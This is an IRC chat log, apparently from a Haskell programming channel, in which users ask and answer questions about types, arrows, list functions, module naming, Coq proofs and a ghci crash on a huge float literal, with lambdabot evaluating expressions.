14:54:51 <luqui> @djinn (Either (b,e) d) -> (Either b d, e)
14:54:51 <lambdabot> -- f cannot be realized.
14:55:32 <vincenz_> @djinn (Eithe b e, d) -> (Either b d, e)
14:55:32 <lambdabot> -- f cannot be realized.
14:55:36 <vincenz_> @djinn (Either b e, d) -> (Either b d, e)
14:55:36 <lambdabot> -- f cannot be realized.
14:55:42 <vincenz_> @djinn (Either b e, d) -> (Either b d)
14:55:42 <lambdabot> f (a, b) =
14:55:42 <lambdabot>     case a of
14:55:42 <lambdabot>     Left c -> Left c
14:55:42 <lambdabot>     Right _ -> Right b
14:56:00 <luqui> hmm, but I need that function to do this...
14:56:06 <luqui> maybe that means what I'm trying to do is not possible...
14:56:18 <koeien> luqui, indeed, what are you trying to do?
14:56:30 <luqui> uh... complicated
14:56:46 <Toxaris> esteban2: so what should (func "test" []) return? the list of functions to be applied is [], so there is nothing to do, so this call should return "test" unchanged
14:57:22 <oerjan> luqui: you don't necessarily have an e at all
14:57:22 <Toxaris> esteban2: do you see that? what line of haskell code do you have to write to achieve it?
14:57:46 <luqui> I've got an arrow whose implementation is type Foo b c = forall d. OtherArrow (Either b d) (Either c d)
14:57:57 <luqui> And I'm trying to write Foo's "first" in terms of OtherArrow
14:59:18 <oerjan> :t first
14:59:20 <lambdabot> forall (a :: * -> * -> *) b c d. (Arrow a) => a b c -> a (b, d) (c, d)
15:00:11 <EvilTerran> f (Left c, e) = Left (c,e); f (Right d, e) = Right d, surely?
15:00:48 <fnord126> Internal to a package, do you need to prefix the modules with the package name? e.g. if you keep some files in the Db directory they are implicitly in the Db directory and you import them with import Db.Xyz.  So then you need to define them as module Db.Xyz...
15:01:06 <fnord126> This can be tedious when moving modules around so I was wondering if I've been overly verbose.
15:01:58 <fnord126> I would use major sources of code like darcs to see how they do it but darcs is noteable for it's er.. oldness?
15:02:10 <EvilTerran> you can't refer to module Foo.Bar as just Bar within module Foo automatically, if that's what you mean
15:02:29 <shapr> I wish I could!
15:02:53 <EvilTerran> module systems are a subject of significant ongoing research, i believe
15:04:50 <glen_quagmire> :t Double
15:04:52 <lambdabot> Not in scope: data constructor `Double'
15:05:13 <fnord126> EvilTerran: no it seems that just internally defining Bar as module Bar () where... will result in 'file does not match module name' since it isn't self defined as module Foo.Bar () where...
15:05:17 <oerjan> :k Double
15:05:19 <lambdabot> *
15:05:40 <glen_quagmire> is double not double precision ieee 754?
15:05:40 <EvilTerran> fnord126, that's exactly what i'm saying
15:05:52 <EvilTerran> well, pretty much.
15:05:56 <EvilTerran> yes, that is a bit irritating
15:06:12 <oerjan> > isIEEE (1::Double)
15:06:14 <lambdabot>  True
15:06:45 <oerjan> in ghc it is
15:07:01 <fnord126> It is irritating since I would like to move packages around as refactoring continues... I'm not sure what modules will stay and which are just places to keep code (though that's probably my fault for being so ill defined at the moment).
15:07:23 <DRMacIver> Moving modules around is definitely one of the places where automated refactoring support would be nice.
15:07:40 <fnord126> the trade off, I guess, would be uncertainty as to whether I found the correct package and built that in.
15:08:32 <EvilTerran> you might be able to roll something using TH or the CPP
15:09:32 <EvilTerran> but it wouldn't be pretty
15:09:38 <fnord126> ok my refactoring is done. I guess it wasn't so bad. :P
15:09:42 <EvilTerran> or both...
15:10:50 <EvilTerran> $(replaceModuleNameWith __FILE__ [| module PlaceholderName (...) where ... |])
15:11:06 <fnord126> ah well, a bit of double book accounting keeps me honest. it's not so bad.
15:11:11 <EvilTerran> and then have something to fixup the value of __FILE__
15:11:56 <glguy> > 5000 / (200 / 8) / 60 / 60
15:11:58 <lambdabot>  5.555555555555556e-2
15:12:32 <fnord126> A refactoring tool will be nice though. If I'm dealing with more than my 6 files I would go straight to sed.
15:12:34 <glen_quagmire> if I want to read in 3 Doubles separated by space, do I parse the String myself?
15:12:55 <glen_quagmire> do line <- readLn;   and split the line?
15:13:05 <DRMacIver> "Go straight to sed. Do not pass go. Do not collect $200."?
15:13:38 <oerjan> glen_quagmire: probably, use words
15:14:13 <glen_quagmire> oerjan: w00t it's in prelude didn't konw that
15:14:17 <malsyned> @hoogle ([a] -> (b, [a])) -> [a] -> [b]
15:14:17 <lambdabot> No matches, try a more general search
15:14:42 <malsyned> can't get much more general than that.  Anybody know of a function like that?
15:14:44 <xerox> malsyned: unfoldr
15:14:44 <gpi5> Consider: 'data T = T String Int'. I can write a function to get the Int 'getI T a b = b'. Is there a better way?
15:14:52 <malsyned> :t unfoldr
15:14:54 <lambdabot> forall b a. (b -> Maybe (a, b)) -> b -> [a]
15:15:36 <malsyned> yeah, that would do it.
15:15:38 <xerox> (-:
15:15:40 <malsyned> thanks
15:15:41 <malsyned> !
15:15:45 <xerox> You're welcome!
15:15:59 <oerjan> gpi5: data T = T { getS :: String, getI :: Int }
15:16:55 <gpi5> oerjan: thanks
15:18:21 <glen_quagmire> how can I do something like:  a,b,c = map read ["1", "2", "3"] ?
15:18:36 <oerjan> [a,b,c] = ...
15:18:50 <EvilTerran> > let [a,b,c] = map read ["1","2","3"] in a + b + (c :: Int)
15:18:52 <lambdabot>  6
15:18:55 <gpi5> How do I take the last n objets in a list?
15:19:08 <glen_quagmire> hoa
15:19:33 <glen_quagmire> gpi5: maybe call head n - m times?
15:19:49 <oerjan> gpi5: there are a couple of tricks
15:20:01 <glen_quagmire> > tail (head (head (head [1,2,3,4,5,6])))
15:20:02 <lambdabot>   add an instance declaration for (Num [[[a]]])
15:20:02 <lambdabot>     In the expression: 6
15:20:04 <oerjan> reverse . take n . reverse is the simplest
15:20:31 <glen_quagmire> > take 3 [1,2,3,4]
15:20:32 <lambdabot>  [1,2,3]
15:20:48 <fnord126> it's n^2 though
15:21:21 <olsner> is it really?
15:21:23 <fnord126> > reverse  . tane 5 . reverse [1,2,3,4,5,6,7,8]
15:21:24 <lambdabot>   Not in scope: `tane'
15:21:34 <fnord126> > reverse  . take 5 . reverse [1,2,3,4,5,6,7,8]
15:21:35 <lambdabot>  Couldn't match expected type `a -> [a1]'
15:21:39 <glen_quagmire> is there a way to pass a list of 3 elements to a function that expects 3 arguments?
15:21:59 <fnord126> reverse is n. and doing it twice..
15:21:59 <glen_quagmire> or, do I have to do [a,b,c] = [1,2,3] ;   func a b c ?
15:22:05 <olsner> reverse is O(n), and take is obviously also O(n), right? So O(3n) = O(n)
15:22:17 <olsner> yes, *twice*, not n times
15:22:36 <koeien> glen,   let [a,b,c] = list in func a b c   is probably the easiest if you don't want to generalise it
15:22:43 <oerjan> > last . join (zipWith (flip const) . drop 5) $ [1..12]
15:22:43 <fnord126> ah right. apologies :(
15:22:45 <lambdabot>  7
15:23:09 <stepcut> hrm, things in Enum have to be mapped to consecutive integers ?
15:23:15 <oerjan> er...
15:23:18 <glen_quagmire> koeien: thank you
15:24:02 <oerjan> bah, forgotten how that worked
15:26:31 <gpi5> And to create a list with n zeros?
15:26:40 <oerjan> > replicate 5 0
15:26:42 <lambdabot>  [0,0,0,0,0]
15:26:50 <gpi5> Thanks!
15:27:18 <glen_quagmire> main = do line <- getLine; let [a,b,c] = words line; in putStrLn (func a b c) main
15:27:57 <oerjan> you either miss a ; or have a stray main there
15:28:25 <oerjan> and in is not used in do
15:31:02 <glen_quagmire> oerjan: ah fixed it yay
15:33:20 <glen_quagmire> i have an expression that freezes my computer. can I try it on lambdabot?
15:33:31 <glen_quagmire> Ctrl+C doesn't work on ghci linux
15:33:37 <oerjan> er... :D
15:33:39 <glen_quagmire> oh no it's frozen crap
15:33:50 <glen_quagmire> sqrt (345345e-3534644574363445345432 * 345345e-3534644574363445345432)
15:33:57 <glen_quagmire> that was the expression
15:34:03 <oerjan> well, it _should_ halt after 3 seconds
15:34:43 <oerjan> this a Double? O_O
15:34:49 <glen_quagmire> hrm I pressed Ctrl+Z and it says: zsh: suspended
15:34:49 <sorear> @bot
15:34:49 <lambdabot> :)
15:34:56 <sorear> glen_quagmire: kill -9 %1
15:35:25 <oerjan> i suppose that would be a bug...
15:35:49 <jbalint> Prelude> sqrt (345345e-3534644574363445345432 * 345345e-3534644574363445345432)
15:35:49 <jbalint> Segmentation fault (core dumped)
15:35:53 <jbalint> :D
15:35:58 <glen_quagmire> sorear: is %1 recently suspended process?
15:36:03 <EvilTerran> underflow?
15:36:06 <jbalint> glen_quagmire: yes
15:36:09 <jbalint> its shell job control
15:36:23 <oerjan> what about just the literal?
15:36:30 <sorear> @bug
15:36:31 <lambdabot> http://hackage.haskell.org/trac/ghc/newticket?type=bug
15:36:32 <balodja> pointless form of "\ a b c d e f g h i j k l m n o p q r s t u v w x y z -> m n o p q r s t u v w x y z a b c d e f g h i j k l" kills lambdabot :)
15:36:42 <sorear> balodja: no it doesn't
15:36:48 <balodja> may be I have just old version
15:36:51 <sorear> @pl \ a b c d e f g h i j k l m n o p q r s t u v w x y z -> m n o p q r s t u v w x y z a b c d e f g h i j k l
15:36:54 <lambdabot> ((((((((((flip .) .) .) .) .) .) .) .) .) .) . (((((((((((flip .) .) .) .) .) .) .) .) .) .) .) . ((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .) . (((((((((((((flip .) .) .) .) .) .) .) .) .) .
15:36:55 <lambdabot> ) .) .) .) . ((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .) .) .) . (((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) . ((((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .)
15:36:55 <lambdabot>  .) .) .) .) . (((((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) . ((((((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) . (((((((((((((((((((flip .) .)
15:36:55 <lambdabot> .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) . ((((((((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) . (((((((((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .)
15:36:57 <lambdabot> .) .) .) .) .) .) .) .) .) .) . ((((((((((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) .) . (((((((((((((((((((((((flip .) .) .) .) .) .) .) .) .) .) .) .) .) .) .)
15:36:58 <balodja> oh
15:37:00 <lambdabot> [39 @more lines]
15:37:02 <idnar> oh wow
15:37:02 <lambdabot> optimization suspended, use @pl-resume to continue.
15:37:06 <jbalint> Prelude> 345345e-3534644574363445345432 * 345345e-3534644574363445345432
15:37:06 <jbalint> Segmentation fault (core dumped)
15:37:09 <idnar> that was pretty impressive
15:37:16 <sorear> jbalint: @bug exists...
15:37:37 <balodja> sorear: hm, I've got 'Plugin `pl' failed with: IRCRaised thread killed', and lambdabot hanged up
15:38:09 <sorear> balodja: if you're running online, that was a known bug
15:38:31 <balodja> So, just an old version
15:39:16 <fnord126> Is there a way to see the current version of a file through a web darcs repository? I only see 'annotate' and 'patches' as links for yi
15:39:22 <glen_quagmire> just entering 345345e-3534644574363445345432  in ghci makes it hang
15:39:43 <oerjan> glen_quagmire: as i expected
15:40:00 <balodja> nothing supernatural
15:40:08 * glen_quagmire tries to compile it and run instead of using it on ghci
15:40:45 <koeien> compiling doesn't seem to work either
15:41:23 <koeien> ghc 6.6 here
15:41:37 <gpi5> I know 'comp (x:xs) = ...' but how is the pattern for a list with only one element?
15:41:48 <koeien> comp [x]   or comp (x:[])
15:41:52 <glen_quagmire> oerjan: how did you expect it? balodja is that what parser is doing?
15:42:41 <balodja> may be it just tries to store in fixed point form?
15:42:42 <gpi5> So comp (x:xs) matches a list with 2+ elements?
15:42:42 <oerjan> glen_quagmire: the number was clearly not within bounds of Double
15:42:46 <koeien> no
15:42:53 <koeien> gpi5: comp (x:xs) matches a list with >= 1 element
15:43:05 <koeien> gpi5: comp (x:x':xs) matches a list with >= 2 elements, and so on
15:43:22 <glen_quagmire> oerjan: shouldn't it be rounded to 0 or something?
15:43:23 <gpi5> Ok, thanks koeien
15:43:28 <koeien> gpi5: and comp [x] matches a list with exactly one element
15:43:29 <oerjan> so i guessed the bug was during conversion, i.e. parsing
15:43:40 <glen_quagmire> i see
15:49:44 <sorear> koeien: Does it not compile?  Or just not run?
15:52:07 <koeien> koeien: not compiling
15:52:10 <koeien> ehm
15:52:13 <koeien> sorear: not compiling
15:52:29 <koeien> sorear: i've tried last darcs version
15:52:46 <koeien> sorear: after a while it says 'out of memory'
15:53:13 <oerjan> ooh - it tries to create a Rational, right?
15:53:33 <oerjan> that would be huge
15:54:02 <koeien> oerjan: yes it actually tried to allocate ~520 MB RAM it says in the error message
15:54:44 <oerjan> so it's not strictly a bug at all
15:56:25 <gpi5> How to convert an Integer to Rational ?
15:56:35 <oerjan> fromIntegral
15:56:40 <koeien> gpi5, fromIntegral
15:56:53 <ari> :t (1%)
15:56:55 <lambdabot> forall t. (Integral t) => t -> Ratio t
15:57:20 <glen_quagmire> > let sqrt x = y in sqrt 4 where x = y*y
15:57:20 <lambdabot>  Parse error
15:59:33 <dons> shachaf: hehe, the openbsd wifi driver for my thinkpad was comitted a couple of hours ago :)
15:59:37 <dons> so not long to wait for support
16:00:12 <ihope> Are instances of Ord expected to follow all the normal rules?
16:01:29 <allbery_b> ari: I think you meant (% 1) there, no?
16:01:43 <allbery_b> ihope: I think things would break if it didn't
16:01:48 <shachaf> dons: What card is it?
16:01:51 <ari> allbery_b: Hm... yes, I suspect you're right :/
16:02:28 <dons> Intel 4965AGN Wi-Fi
16:03:40 <shachaf> 3945ABG worked out of the box, for me. N might be harder, though.
16:03:43 <fnord126> ooh i only have intel ipw3945
16:04:16 * oerjan saw 4965AGN and thought "ftagn?"
16:04:44 <oerjan> this being, obviously, a bad omen
16:04:53 * allbery_b has suspected some video cards were created or powered by Cthulhu before...
16:05:42 <conal> I'm doing some UI design and am considering using a "context menu", which is a popular Windows UI mechanism.  Does such a thing exist in Linux desktops?  What about Mac?
16:06:23 <shachaf> conal: What are "Linux desktops"? GTK and Qt have it.
16:06:44 <shachaf> conal: And OSX, at least.
16:07:23 <sjanssen> conal: context menus are a little less popular on OS X due to the lack of a right mouse button
16:07:35 <conal> shachaf: i don't know what linux desktops are.  i guess i mean are they a part of the GUI experience as people expect.  and maybe linux is too diverse for there to be an answer.
16:08:14 <conal> sjanssen: yeah.  i'm worried about that one.  is there another way mac UIs do something like a context menu, without a right button?
16:08:25 <shachaf> conal: Well, most graphical desktops you'll find will have a context menu in one way or another, I think.
16:08:29 <shachaf> conal: Ctrl-click.
16:08:30 <sorear> OSX makes very extensive use of control-clicking
16:08:31 <sjanssen> conal: yeah, option-click or something
16:08:33 <shachaf> conal: (I think.)
16:08:34 <EvilTerran> option-click or hold-click, iirc
16:08:55 <EvilTerran> or just plug in a multi-button mouse. heck, apple even make one that'll match your mac now. ;]
16:09:03 <phobes> Does anyone here have much experience with a dependent type system?  I'm curious how awkward it is to start with axiomatic description of what a function or module should be, encode that in the type system, and then provide an implementation with the correct type
16:09:26 <sorear> X11 programs often have three context menues for ctl-left, ctl-middle, and ctl-right
16:09:51 <sorear> phobes: it's not hard, the technique is called "strong specification" in most circles
16:10:10 <shachaf> sorear: Native X programs, anyway.
16:10:14 <sorear> phobes: "weak specification" has you write the function normally, and create the proof separately
16:10:30 <shachaf> sorear: Very few GUIs that I've used have had that.
16:10:31 <sebell> My single-button mouse is much easier to use because I can use my whole hand to `click', rather than just one finger
16:10:31 <phobes> sorear: have you played with both approaches?  which do you prefer?
16:10:48 <sorear> phobes: otoh, it's extremely tedious; I have a working certified towars of hanoi solver... in ~200 LoC
16:11:16 <phobes> sorear:  ugh, which tool did you use for that?
16:11:27 <sorear> phobes: strong uses less code, usually, but is less flexible when you realize you need a new property
16:11:30 <sorear> Coq
16:11:42 <sorear> http://members.cox.net/stefanor/hanoi.v
16:11:49 <sorear> actually, I don't recall ever testing it
16:12:13 <conal> thanks for the input, all.  i'll go for the context menus and try to abstract the physical convention to raise them so they'll fit various OSs & window systems.
16:12:16 <phobes> sorear:  testing would just be needed to test the specification I suppose :)
16:12:26 <oerjan> sorear: you knuth wannabe :D
16:13:32 <phobes> sorear:  I'm surprised that strong uses less code.  Is that true even if the strong system is allowed to do some searching for the proof?
16:13:44 <phobes> err second use was weak*
16:13:52 <phobes> ...even if the weak system...
16:14:22 <sorear> well both systems do searching in most practical systems
16:14:29 <sorear> everywhere it says auto. in mine
16:15:10 <sorear> the main issue, is that the structure of the proof normally mirrors the structure of the code
16:15:24 <sorear> if you take the strong path, you only have to write the control structure once
16:15:37 <phobes> I think I should just play with CoQ and get some intuition about it
16:16:07 <sorear> only the first letter is capitalized :)
16:16:12 <gpi5> Last element from a list?
16:16:13 <phobes> yar
16:16:19 <phobes> I have a twitch shift key
16:16:20 <sjanssen> > last [1..10]
16:16:22 <lambdabot>  10
16:17:03 <sorear> > last [1..
16:17:03 <lambdabot>  Parse error
16:17:04 <sorear> > last [1..]
16:17:08 <lambdabot> Terminated
16:17:13 <gpi5> Thanks
16:17:16 <sorear> anyways, Coq is merely the system I am most familiar with
16:17:19 <phobes> sorear:  So in towers of hanoi the actual code for the approach should be a handful of lines at most I'd think, agree?  So we have a ~30x-50x penalty for the proof here?
16:17:23 <sorear> I make no claims to it being the best
16:17:45 <sorear> phobes: yeah; that's pretty typical for me I think
16:18:24 <phobes> Towers of hanoi obviously terminates... they need to add the obviously operator
16:18:32 <sorear> smaller example: http://hpaste.org/1986
16:18:44 <phobes> I think I'll start with Towers of Hanoi
16:18:51 <phobes> Thanks for the code!
16:18:55 <reffie> start with something usefgul
16:19:12 <phobes> If towers of hanoi is 200 lines, then I think 'something useful' is out of reach
16:19:33 <phobes> I'm off... thanks sorear
16:21:13 <monochrom> A toy parser is probably 20 lines in Haskell, 200 lines in C, and 2000 lines in assembly.
16:22:01 <monochrom> Similarly, a proved tower of hanoi is probably 20 lines in a futuristic language, 200 lines in Coq, and 2000 lines in Hoare logic.
16:22:02 <cytzol> Using Parsec is too easy, though. It's, like, cheating.
16:22:08 <EvilTerran> and in strong specified Coq?
16:22:20 <EvilTerran> meh, ignore me, typing while scrolled up
16:22:49 <EvilTerran> cytzol, even if parsec were proven correct?
16:23:09 <cytzol> ok maybe not then
16:23:16 <monochrom> If you look at 2000 lines of assembly and go "gee, even a toy parser is 2000 lines of code, programming is impractical!" that's obviously wrong, you are looking at the wrong language, not the futility of programming.
16:23:53 <monochrom> The correct conclusion is "Coq is still low-level, more research needed", not "forget proofs".
16:23:55 * EvilTerran considers parsec to be what haskell has in place of perl's regexes. as such, i have no qualms about using it.
16:24:15 <EvilTerran> anywhere and everywhere. ;]
16:24:24 <monochrom> But somehow, most people, even most otherwise bright people here, can't make the connection.
16:24:33 <samreid> don't want to use Parsec?  Add 30 lines or so to roll your own primitive combinators
16:24:48 <monochrom> It seems they use their left brain for programming and their right brain for proofs, and never make the connection.
16:25:33 <EvilTerran> nah, monochrom, it's more that we refuse to believe that any language other than haskell can be any good *g*
16:27:27 <olsner> but aren't you just moving the problem of "does this program solve the problem?" to "does this proof correspond to the solution of the problem?"
16:28:03 <dons> epigram might be ok , EvilTerran
16:28:11 <dons> the rule is: only languages with stronger type systems can be better
16:28:41 <EvilTerran> i'm kidding anyway. Coq's on my to-do list - as is python, actually, 'cos i'd like a tidier language than perl for Getting Things Done
16:30:41 <EvilTerran> olsner, i think, in a perfect language, the proofs would be sufficiently high-level for it to be clear that the solution follows directly from their correctness
16:31:06 <sorear> olsner: while the proof terms are long, their types are not.
16:31:41 <gpi5> How to create 1/2 as a Rational ?
16:31:50 <EvilTerran> > (1/2) :: Rational
16:31:52 <lambdabot>  1%2
16:31:54 <sorear> olsner: my towers of hanoi program's type is basically forall s1 s2, closure move s1 s2 <-> length s1 == length s2
16:31:55 <EvilTerran> > 0.5 :: Rational
16:31:56 <lambdabot>  1%2
16:32:02 <EvilTerran> > 1 % 2
16:32:03 <lambdabot>  1%2
16:32:10 <EvilTerran> ?type 1 % 2
16:32:11 <lambdabot> forall t. (Integral t) => Ratio t
16:32:17 <pgavin> > 1/2
16:32:18 <lambdabot>  0.5
16:32:19 <EvilTerran> take your pick :)
16:32:19 <gpi5> > 1 %2
16:32:20 <lambdabot>  1%2
16:32:37 <gpi5> 1 % 2 doesn't work in my code
16:32:38 <sorear> olsner: which is more direct and concise than the Haskell, even after considering the definition of move (3 lines)
16:32:39 <gpi5> ?
16:32:45 <EvilTerran> ?index (%)
16:32:45 <lambdabot> Data.Ratio
16:32:47 <gpi5> % is unknown
16:32:58 <EvilTerran> do you import Data.Ratio?
16:33:06 <sorear> olsner: the proof is 200 lines, and is completely unreadable, but you don't have to - if it type checks, it's correct
16:33:42 <olsner> the proof may be correct, as in internally consistent.. but still prove something entirely different from the towers of hanoi problem
16:33:48 <olsner> right?
16:33:51 <sorear> @seen ccshan
16:33:51 <lambdabot> I haven't seen ccshan.
16:33:52 <EvilTerran> sorear, i think the question isn't "is the proof correct?" but "okay, my program is proven to do what it does correctly. but does it do the *right thing* correctly?"
16:34:06 <sorear> olsner: that's what I just answered
16:34:19 <sorear> olsner: the statement of the theorem is short and readable
16:34:40 <sorear> olsner: shorter than even a Haskell algorithmic description
16:34:43 <olsner> forall s1 s2, closure move s1 s2 <-> length s1 == length s2
16:34:47 <olsner> this?
16:34:50 <sorear> yes
16:34:51 <EvilTerran> if it's obvious from the statement of the theorem that the proof => program solves the tower of hanoi problem, then everything's cool. otherwise, =/
16:35:31 <sorear> for all pairs of states, if there exists a sequence of moves connecting them, than there is the same number of rings in each, and conversely
16:36:16 <olsner> ah, I see
16:36:17 <EvilTerran> so that's "this program does not create nor destroy rings in the course of solving the problem"
16:36:34 <ddarius> Bye, bye proof irrelevancy.
16:36:49 <EvilTerran> or rather, "this program creates as many rings as it destroys ..."
16:37:25 <olsner> I suppose I should learn something about these kinds of proofs one day then
16:37:48 <olsner> not today though ;-) night all
16:37:58 <EvilTerran> we also need "this program doesn't cheat some other way" and "this program produces the correct end state in finite time", tho
16:38:02 <sorear> ddarius: sure, proof irrelevancy.  well, I don't actually care what the sequece of moves is, I just wanted to know it exists :)
16:38:51 <sorear> EvilTerran: 'move' is a data type defined (GADT-style) to represent only legal moves; and the Coq language makes infinite loops impossible, so we get the second for free.
16:39:02 <ddarius> sorear: In general, if you were in the business of deriving programs from proofs of there specification, you still need to pick "fast" proofs.
16:39:04 <EvilTerran> ah. cool.
16:40:47 <ddarius> Of course you can add performance aspects to the specification.
16:41:07 <nominolo> sorear, doesn't coq support co-inductive data types?
16:41:53 <sorear> nominolo: it does; why?  games of hanoi are finite
16:42:52 * nominolo grabs coq-book
16:43:05 <sorear> ddarius: that doesn't sit well in the context of Coq's already delicate overloading of -> to represent function spaces, propositional overloading, and predicate kind construction... :(
16:43:34 <sorear> s/l overloading/l implication/
16:43:53 * EvilTerran thinks... can one enforce the "fresh"ness of a tyvar using forall?
16:44:04 * EvilTerran is doing something horrible with -fallow-undecidable-instances
16:44:05 <sorear> yes.
16:45:18 <nominolo> sorear, ok, so coq allows reasoning over infinite structures, but i didn't mean to imply that this is necessarily useful in this context
16:45:53 * ddarius redubs (a subset of) "formal methods" to "interactive compilation."
16:53:29 <EvilTerran> if you say "forall x, p(x)" as "globally p", what do you say "exists x s.t. p(x)" as?
16:53:40 <EvilTerran> "somewhere p"?
16:54:43 <nominolo> EvilTerran, that sounds pretty much like temporal logics
16:55:43 * ddarius doesn't say "globally p" except, maybe, in some contexts.
16:55:58 <EvilTerran> hm. i'm just speaking hypothetically, here.
16:56:26 <byorgey> "locally p"?
16:56:32 <byorgey> not really =)
16:56:54 <byorgey> "somewhere" sounds good to me
16:58:00 <EvilTerran> i suppose i should use "everywhere" instead of "globally" in that case, but it's longer...
16:58:21 <byorgey> longer to type, but not to say
17:00:08 <EvilTerran> well, this is when having constructors (Somewhere p) and (Everywhere p), so i am typing it
17:00:25 <ddarius> Why not just, Forall p and Exists P
17:01:30 <ddarius> forall x. p x, forall (\x -> p x)
17:01:57 <EvilTerran> ehh
17:01:58 <malsyned> @src unlines
17:01:59 <lambdabot> unlines = concatMap (++ "\n")
17:02:35 <EvilTerran> it makes more sense as an adjective in this context, imo
17:02:45 <newsham> > ["hrmm", "whats", "this"] >>= (++ "\n")
17:02:47 <lambdabot>  "hrmm\nwhats\nthis\n"
17:02:57 <monochrom> forally p, existly p
17:03:08 <EvilTerran> o.
17:03:20 <malsyned> @src unwords
17:03:20 <lambdabot> unwords [] = ""
17:03:20 <lambdabot> unwords ws = foldr1 (\w s -> w ++ ' ':s) ws
17:03:23 <xerox> > unlines ["kinda","this","one"]
17:03:24 <lambdabot>  "kinda\nthis\none\n"
17:03:57 <EvilTerran> unwords = concat . intersperse " ", i think
17:04:12 <malsyned> EvilTerran: yeah.  that's how I had implemented it before I realized it existed.
17:04:21 <malsyned> There's not really a function for concat . intersperse "\n" though, huh?
17:04:25 <ddarius> > concatMap (++ " ") ["ab", "cd" "ef"]
17:04:26 <lambdabot>  Couldn't match expected type `t -> [Char]'
17:04:38 <byorgey> @check \x -> unwords x == (concat . intersperse " " $ x)
17:04:42 <lambdabot>  OK, passed 500 tests.
17:04:54 <ddarius> > (++ " ") =<< ["ab", "cd" "ef"]
17:04:55 <lambdabot>  Couldn't match expected type `t -> [Char]'
17:05:26 <newsham> > (unwords.map unlines.map words.lines) "testing this\nout quickly"
17:05:28 <lambdabot>  "testing\nthis\n out\nquickly\n"
17:06:23 <newsham>  (unlines.map unwords.map lines.words) "testing this\nout quickly"
17:06:29 <newsham> > (unlines.map unwords.map lines.words) "testing this\nout quickly"
17:06:30 <lambdabot>  "testing\nthis\nout\nquickly\n"
17:06:36 <byorgey> ddarius: you're missing a comma there
17:07:15 <ddarius> byorgey: Clearly we need that FromString typeclass, so it can Do The Right Thing
17:07:44 <ddarius> Anyway, I know what the result is.
17:08:00 <byorgey> ddarius: hm, what would the (->) instance be for FromString?
17:08:43 <ddarius> Clearly it would interpret my String as the source code to a program of type String -> String!
17:08:55 <byorgey> sweet!
17:09:21 <byorgey> > "unwords" "like this?"
17:09:22 <lambdabot>  Couldn't match expected type `t1 -> t'
17:09:49 <byorgey> well, except unwords isn't of type String -> String, never mind =)
17:37:44 <andrei> I'm using arrows and have one arrow operation I have to apply to a list of arguments, what's the equivalent of sequence for arrows? (or how is this normally done?)
17:38:14 <ddarius> @hoogle sequenceA
17:38:15 <lambdabot> No matches found
17:38:24 <mrd> @hoogle listA
17:38:24 <lambdabot> Array.listArray :: Ix a => (a, a) -> [b] -> Array a b
17:38:24 <lambdabot> Data.Array.listArray :: Ix i => (i, i) -> [e] -> Array i e
17:38:24 <lambdabot> Data.Array.IArray.listArray :: (IArray a e, Ix i) => (i, i) -> [e] -> a i e
17:39:16 <ddarius> @docs Control.Arrow
17:39:16 <lambdabot> http://haskell.org/ghc/docs/latest/html/libraries/base/Control-Arrow.html
17:39:42 <andrei> I looked there, but couldn't seem to find anything that fit
17:41:51 <mrd> http://www.fh-wedel.de/~si/HXmlToolbox/hdoc_arrow/Control-Arrow-ArrowList.html
17:41:54 <lambdabot> http://tinyurl.com/upyok
17:42:01 <mrd> i don't know why ArrowList is not in the standard libs
17:44:54 <EvilTerran> mrd, isn't it the Kleisli arrow of the [] Monad?
17:45:26 <Cale> EvilTerran: it's the generalisation of that
17:45:31 <Cale> (it's a class)
17:45:40 <EvilTerran> ah, i think i see
17:45:45 * EvilTerran still doesn't really grok arrows
17:46:01 <ddarius> What's so complicated about Freyd categories?
17:46:27 <EvilTerran> ha. ha. i understand the basic concept fine, i just don't quite follow the mental processes involved in actually using them
17:48:28 <Cale> There was another approach which was much more natural -- it turns out that you can think of arrows as monoid objects in a certain category of bifunctors over C.
17:49:43 <EvilTerran> i'll make a note of that for when i get to do the category theory course in three years ;]
17:49:47 <ddarius> The intuition of the Freyd category or kappa category approach strongly matches the intuition (and for Freyd categories implementation) of the ideas in Haskell.
17:50:17 <EvilTerran> until then, to borrow a phrase; i see words, but they don't make any sense!
17:50:35 <ddarius> Category theory is easy.
17:51:39 <EvilTerran> maybe for those of you on the inside
17:51:43 * Saizan has used a monoid to generate arrow code with TH
18:00:15 <pjd> ddarius: ...you just stare at the arrows until drops of blood form on your forehead?
18:00:54 <ddarius> I prefer Hom-sets and representable functors.
18:02:24 * idnar needs to look at comonads some more
18:03:31 <FMota> why is reddit down? :/
18:03:48 <ddarius> FMota: Because there is a God?
18:03:49 <idnar> poor application / network architecture? :P
18:03:54 <Nafai> FMota: So you can actually get work done!
18:04:02 <FMota> Nafai: you win. :)
18:04:29 <Nafai> FMota: Though I admit I just noticed it myself :)
18:05:33 <sioraiocht> don't tell me peopel model computation after comonads, too
18:05:41 <sioraiocht> I'll die, I already don't grasp arrows
18:06:19 * mrd dares not mention coinduction
18:06:20 <mauke> there's no limits to what you can't understand!
18:06:34 <mauke> thank you, haskell
18:06:37 <ddarius> Your brain is a finite machine.
18:07:00 <mrd> you're on the right track if every day after learning something you feel even stupider
18:07:03 <monochrom> Your brain is the finite-state part of a Turing machine.
18:07:12 <sioraiocht> corecursion upset me at first, too
18:07:36 <sioraiocht> but I THINK I've got my head wrapped around that
18:07:41 <ddarius> monochrom: What's the tape?
18:08:00 <monochrom> Microsoft Word is the tape. XD
18:08:05 <pjd> sioraiocht: comonads are simpler than arrows
18:08:24 <monochrom> Don't try to wrap your head around concepts. Wrap concepts around your head - immerse yourself.
18:09:26 * sioraiocht doesn't use Microsoft Word.  
18:09:39 * sioraiocht uses Emacs and LaTeX.  Can my tape at least have pretty formatting?
18:09:48 <monochrom> Yes.
18:09:57 <sioraiocht> well that's good
18:10:04 <monochrom> But most people's tape is Outlook Express.
18:10:12 <sioraiocht> ewww
18:10:30 <sioraiocht> that means most of their knowledge spreads virally...and it's about penis enlargement
